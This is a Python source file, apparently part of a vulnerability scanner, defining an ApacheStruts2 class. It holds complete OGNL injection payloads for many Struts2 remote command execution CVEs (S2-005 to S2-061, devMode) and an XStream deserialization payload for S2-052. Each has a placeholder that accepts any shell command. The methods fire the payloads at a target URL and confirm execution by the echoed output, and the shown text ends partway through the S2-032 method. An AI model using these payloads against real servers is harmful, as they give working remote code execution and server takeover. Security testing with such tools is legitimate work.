#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
import http.client
import base64
from thirdparty import requests
import threading
import http.client
from module import globals
from core.verify import verify
from core.verify import misinformation
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump
from module.api.dns import dns_result, dns_request


class ApacheStruts2():
    def __init__(self, url):
        self.threadLock = threading.Lock()
        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.ceye_domain = globals.get_value("ceye_domain")
        self.ceye_token = globals.get_value("ceye_token")
        self.ceye_api = globals.get_value("ceye_api")
        self.threadLock = threading.Lock()
        self.url = url
        self.payload_s2_005 = r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.Method" \
                              r"Accessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.ut" \
                              r"il.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'RECOMMAND\'')(d))&(h)(('\43myret\75@java.lang.Runtim" \
                              r"e@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputSt" \
                              r"ream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('" \
                              r"\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionCo" \
                              r"ntext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"
        self.payload_s2_008 = '?debug=command&expression=(%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%' \
                              '23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecutio' \
                              'n"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%' \
                              '27RECOMMAND%27%29.getInputStream%28%29%29)'
        self.payload_s2_009 = r"class.classLoader.jarPath=%28%23context[%22xwo" \
                              r"rk.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boo" \
                              r"lean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess" \
                              r"%22]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29." \
                              r"exec%28%27RECOMMAND%27%29.getInputStream%28%29%2c%23b%3dnew+ja" \
                              r"va.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.Buffere" \
                              r"dReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read" \
                              r"%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionCo" \
                              r"ntext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println" \
                              r"%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.clas" \
                              r"sLoader.jarPath%29%28%27meh%27%29]"
        self.payload_s2_013 = '?233=%24%7B%23_memberAccess%5B"allowStaticMetho' \
                              'dAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime()' \
                              '.exec(%27RECOMMAND%27).getInputStream()%2C%23b%3Dnew%20java.io.' \
                              'InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%' \
                              '23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%' \
                              '3D%40org.apache.struts2.ServletActionContext%40getResponse().ge' \
                              'tWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.Str' \
                              'ing(%23d))%2C%23out.close()%7D'
        self.payload_s2_015 = r"/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAcces" \
                              r"s.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberA" \
                              r"ccess, true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RECOMMAND').getInp" \
                              r"utStream())}.action"
        self.payload_s2_016_1 = r"?redirect:${%23req%3d%23context.get(%27co%27" \
                                r"%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atc" \
                                r"her.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java" \
                                r".util.Scanner((new%20java.lang.ProcessBuilder(%27RECOMMAND%27." \
                                r"toString().split(%27\\s%27))).start().getInputStream()).useDel" \
                                r"imiter(%27\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27," \
                                r"%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony" \
                                r".xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes" \
                                r"%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27)," \
                                r"%23resp.getWriter().println(%23str),%23resp.getWriter().flush" \
                                r"(),%23resp.getWriter().close()}"
        self.payload_s2_016_2 = base64.b64decode("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN2"
                                                 "0ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2b"
                                                 "GV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vz"
                                                 "c0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3R"
                                                 "yZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMj"
                                                 "NyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZ"
                                                 "GlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJh"
                                                 "Y3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXR"
                                                 "lcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ==")
        self.payload_s2_029 = r"(%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtected" \
                              r"Access%27]=true,%23_memberAccess[%27excludedPackageNamePatterns%27]=%23_memberAccess[%27acceptProperti" \
                              r"es%27],%23_memberAccess[%27excludedClasses%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAcce" \
                              r"ss[%27allowPackageProtectedAccess%27]=true,%23_memberAccess[%27allowStaticMethodAccess%27]=true,@org.a" \
                              r"pache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27RECOMMAND%27).getInputStream" \
                              r"()))"
        # Unknown bug... ...
        #        self.payload_s2_032 = r"?method:%23_memberAccess%3d@ognl.OgnlContext@D EFAULT_MEMBER_ACCESS,%23res%3d%40org." \
        #            r"apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding" \
        #            r"[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23pa" \
        #            r"rameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.ne" \
        #            r"xt()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=RECOMMAND&" \
        #            r"pp=____A&ppp=%20&encoding=UTF-8"
        self.payload_s2_032 = ("?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3D%40org.a"
                               "pache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding"
                               "(%23parameters.encoding%5B0%5D),%23w%3D%23res.getWriter(),%23s%3Dnew+java.util.Scanner"
                               "(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter"
                               "(%23parameters.pp%5B0%5D),%23str%3D%23s.hasNext()%3F%23s.next()%3A%23parameters.ppp%5B0%5D,%23w."
                               "print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=RECOMMAND&pp=____A&ppp=%20&encoding=UTF-8")
        self.payload_s2_045 = r"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
                              r"(#_memberAccess?(#_memberAccess=#dm):" \
                              r"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \
                              r"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \
                              r"(#ognlUtil.getExcludedPackageNames().clear())." \
                              r"(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))." \
                              r"(#req=@org.apache.struts2.ServletActionContext@getRequest())." \
                              r"(#res=@org.apache.struts2.ServletActionContext@getResponse())." \
                              r"(#res.setContentType('text/html;charset=UTF-8'))." \
                              r"(#s=new java.util.Scanner((new java.lang.ProcessBuilder" \
                              r"('RECOMMAND'.toString().split('\\s'))).start().getInputStream()).useDelimiter('\\AAAA'))." \
                              r"(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str))." \
                              r"(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}"
        self.payload_s2_046 = '''-----------------------------\r\n ''' \
                              '''Content-Disposition: form-data; name=\"foo\"; filename=\"%{''' \
                              '''(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_M''' \
                              '''EMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#conta''' \
                              '''iner=#context['com.opensymphony.xwork2.ActionContext.contai''' \
                              '''ner']).(#ognlUtil=#container.getInstance(@com.opensymphony.''' \
                              '''xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageN''' \
                              '''ames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#''' \
                              '''context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#iswin=''' \
                              '''(@java.lang.System@getProperty('os.name').toLowerCase().con''' \
                              '''tains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/''' \
                              '''bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds))''' \
                              '''.(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros''' \
                              '''=(@org.apache.struts2.ServletActionContext@getResponse().ge''' \
                              '''tOutputStream())).(@org.apache.commons.io.IOUtils@copy(#pro''' \
                              '''cess.getInputStream(),#ros)).(#ros.flush())}\x00b\"\r\nCont''' \
                              '''ent-Type: text/plain\r\n\r\nzzzzz\r\n----------------------''' \
                              '''---------\r\n\r\n'''
        self.payload_s2_048 = r"%{(#szgx='multipart/form-data').(#dm=@ognl.Ogn" \
                              r"lContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAcces" \
                              r"s=#dm):((#container=#context['com.opensymphony.xwork2.ActionCo" \
                              r"ntext.container']).(#ognlUtil=#container.getInstance(@com.open" \
                              r"symphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPa" \
                              r"ckageNames().clear()).(#ognlUtil.getExcludedClasses().clear())" \
                              r".(#context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#iswin=" \
                              r"(@java.lang.System@getProperty('os.name').toLowerCase().contai" \
                              r"ns('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash'," \
                              r"'-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redi" \
                              r"rectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apach" \
                              r"e.struts2.ServletActionContext@getResponse().getOutputStream()" \
                              r")).(@org.apache.commons.io.IOUtils@copy(#process.getInputStrea" \
                              r"m(),#ros)).(#ros.close())}"
        self.payload_s2_052 = '''<map> <entry> <jdk.nashorn.internal.objects''' \
                              '''.NativeString> <flags>0</flags> <value class="com.sun.xml.i''' \
                              '''nternal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHand''' \
                              '''ler> <dataSource class="com.sun.xml.internal.ws.encoding.xm''' \
                              '''l.XMLMessage$XmlDataSource"> <is class="javax.crypto.Cipher''' \
                              '''InputStream"> <cipher class="javax.crypto.NullCipher"> <ini''' \
                              '''tialized>false</initialized> <opmode>0</opmode> <serviceIte''' \
                              '''rator class="javax.imageio.spi.FilterIterator"> <iter class''' \
                              '''="javax.imageio.spi.FilterIterator"> <iter class="java.util''' \
                              '''.Collections$EmptyIterator"/> <next class="java.lang.Proces''' \
                              '''sBuilder"> <command> <string>RECOMMAND</string> </command> ''' \
                              '''<redirectErrorStream>false</redirectErrorStream> </next> </''' \
                              '''iter> <filter class="javax.imageio.ImageIO$ContainsFilter">''' \
                              ''' <method> <class>java.lang.ProcessBuilder</class> <name>sta''' \
                              '''rt</name> <parameter-types/> </method> <name>foo</name> </f''' \
                              '''ilter> <next class="string">foo</next> </serviceIterator> <''' \
                              '''lock/> </cipher> <input class="java.lang.ProcessBuilder$Nul''' \
                              '''lInputStream"/> <ibuffer></ibuffer> <done>false</done> <ost''' \
                              '''art>0</ostart> <ofinish>0</ofinish> <closed>false</closed> ''' \
                              '''</is> <consumed>false</consumed> </dataSource> <transferFla''' \
                              '''vors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.n''' \
                              '''ashorn.internal.objects.NativeString> <jdk.nashorn.internal''' \
                              '''.objects.NativeString reference="../jdk.nashorn.internal.ob''' \
                              '''jects.NativeString"/> </entry> <entry> <jdk.nashorn.interna''' \
                              '''l.objects.NativeString reference="../../entry/jdk.nashorn.i''' \
                              '''nternal.objects.NativeString"/> <jdk.nashorn.internal.objec''' \
                              '''ts.NativeString reference="../../entry/jdk.nashorn.internal''' \
                              '''.objects.NativeString"/> </entry> </map>'''
        self.payload_s2_057 = r"/struts2-showcase/" + "%24%7B%0A(%23dm%3D%40ognl" \
                                                      r".OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B's" \
                                                      r"truts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensympho" \
                                                      r"ny.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInsta" \
                                                      r"nce(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou." \
                                                      r"getExcludedPackageNames().clear()).(%23ou.getExcludedClasses()" \
                                                      r".clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang." \
                                                      r"Runtime%40getRuntime().exec('RECOMMAND')).(%40org.apache.commo" \
                                                      r"ns.io.IOUtils%40toString(%23a.getInputStream()))%7D" + "/actionC" \
                                                                                                               r"hain1.action"
        self.payload_s2_059 = r"id=%25%7b%23_memberAccess.allowPrivateAccess%3" \
                              r"Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_" \
                              r"memberAccess.excludedClasses%3D%23_memberAccess.acceptProperti" \
                              r"es%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_member" \
                              r"Access.acceptProperties%2C%23res%3D%40org.apache.struts2.Servl" \
                              r"etActionContext%40getResponse().getWriter()%2C%23a%3D%40java.l" \
                              r"ang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%2" \
                              r"3a.exec('RECOMMAND').getInputStream()).useDelimiter('%5C%5C%5C" \
                              r"%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.p" \
                              r"rint(%23str)%2C%23res.close()%0A%7d"
        self.payload_s2_061 = """%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).""" \
                              """(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).""" \
                              """(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).""" \
                              """(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).""" \
                              """(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.""" \
                              """get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).""" \
                              """(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).""" \
                              """(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).""" \
                              """(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).""" \
                              """(%23cmd%3d%7b%27RECOMMAND%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"""
        self.payload_s2_devMode = r"?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" \
                                  r"%3F(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toS" \
                                  r"tring(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toStri" \
                                  r"ng.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=RECOMMAND"

    def s2_005_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-005"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "XWork ParameterInterceptors bypass allows remote command execution"
        self.vul_info["vul_numb"] = "CVE-2010-1870"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2010-08-15"
        self.vul_info["vul_vers"] = "2.0.0 - 2.1.8.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Developers should immediately upgrade to Struts 2.2.1 or read the following " \
                                    "solution instructions carefully for a configuration change to mitigate the vulnerability"
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_005.replace("RECOMMAND", cmd)
        try:
            self.req = requests.post(self.url, headers=self.headers, data=self.payload, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload_s2_005.replace("RECOMMAND", cmd)
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_008_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-008"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Multiple critical vulnerabilities in Struts2"
        self.vul_info["vul_numb"] = ""
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2010-08-15"
        self.vul_info["vul_vers"] = "2.0.0 - 2.3.17"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Remote command execution and arbitrary file overwrite, Strict DMI does not work correctly"
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_008.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_009_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-009"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "ParameterInterceptor vulnerability allows remote command execution"
        self.vul_info["vul_numb"] = "CVE-2011-3923"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2011-01-20"
        self.vul_info["vul_vers"] = "2.1.0 - 2.3.1.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Developers should immediately upgrade to Struts 2.3.1.2 or read the following solution " \
                          "instructions carefully for a configuration change to mitigate the vulnerability"
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_009.replace("RECOMMAND", cmd)
        try:
            self.req = requests.post(self.url, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_013_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-013"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts2 Remote command execution"
        self.vul_info["vul_numb"] = "CVE-2013-1966"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2011-01-20"
        self.vul_info["vul_vers"] = "2.0.0 - 2.3.14.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Developers should immediately upgrade to at least Struts 2.3.14.2"
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_013.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_015_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-015"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts2 Remote command execution"
        self.vul_info["vul_numb"] = "CVE-2013-2134"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2013-05-13"
        self.vul_info["vul_vers"] = "2.0.0 - 2.3.14.2"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "A vulnerability introduced by wildcard matching mechanism or double evaluation of OGNL Expression allows remote command execution."
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_015.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_016_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-016"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts2 Remote command execution"
        self.vul_info["vul_numb"] = "CVE-2013-2251"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2013-07-09"
        self.vul_info["vul_vers"] = "2.0.0 - 2.3.15"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = 'A vulnerability introduced by manipulating parameters prefixed with ' \
                                    '"action:"/"redirect:"/"redirectAction:" allows remote command execution'
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        self.pocname = "Apache Struts2: S2-016"
        md = random_md5()
        cmd = "echo " + md
        self.payload_1 = self.payload_s2_016_1.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload_1, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload_1
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_029_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-029"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts2 Possible Remote Code Execution vulnerability"
        self.vul_info["vul_numb"] = "CVE-2016-0785"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2016-04-29"
        self.vul_info["vul_vers"] = "2.0.0 - 2.3.24.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = 'Forced double OGNL evaluation, when evaluated on raw user input in tag attributes, ' \
                                    'may lead to remote code execution.'
        self.vul_info["cre_date"] = "2021-01-30"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_029.replace("RECOMMAND", cmd)
        if r"?" not in self.url:
            self.url_029 = self.url + "?id="
        try:
            self.req = requests.get(self.url_029 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_032_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-032"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts2 Possible Remote Code Execution"
